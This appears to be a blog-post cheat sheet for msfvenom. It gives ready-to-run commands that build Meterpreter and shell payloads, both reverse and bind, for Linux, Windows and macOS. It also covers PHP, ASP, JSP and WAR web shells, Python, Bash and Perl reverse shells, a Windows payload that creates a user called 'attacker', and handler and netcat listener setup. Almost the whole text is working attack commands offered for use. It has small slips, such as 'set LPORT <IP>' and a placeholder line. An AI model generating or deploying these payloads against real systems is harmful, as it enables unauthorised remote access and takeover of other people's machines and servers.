---
title:  "Msfvenom Payload Cheat Sheet"
header: "Msfvenom Payload Cheat Sheet"
categories: 
  - Cheatsheet
tags:
  - Msfvenom
---

Msfvenom (replaced the former msfpayload and msfencode tools) and is a tool that can be used to generate payloads as standaline files and encode them if needed. Everybody likes shells, right?

# Usage  
***

Insert picture here

# Basic Commands  
***
#### List available payloads  
`msfvenom -l`

#### Encoding Payloads  
`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

# Handler Setup  
***
#### Meterpreter  
`msfconsole -q`
`use exploit/multi/handler`
`set PAYLOAD <PAYLOAD>`
`set LHOST <IP>`
`set LPORT <IP>`
`set ExitOnSession false`
`exploit -j -z`

#### Netcat  
`nc -nlvp <PORT>

# Linux  
***
#### Reverse Shell  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`

#### Bind Shell  
`msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > shell.elf`

# Windows  
***
#### Reverse Shell  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe`

#### Bind Shell  
`msfvenom -p windows/meterpreter/bind_tcp RHOST= (IP Address) LPORT=(Your Port) -f exe > bind.exe`

#### CMD Shell  
`msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe`

#### User Creation  
`msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe`

# Mac  
***
#### Reverse Shell  
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho`

#### Bind Shell  
`msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho`

# Web Payloads  
***
#### PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`  
`cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

#### ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`

#### JSP  
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`

#### WAR  
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

# Scripting Payloads  
***
#### Python  
`msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`

#### Bash  
`msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`

#### Perl  
`msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
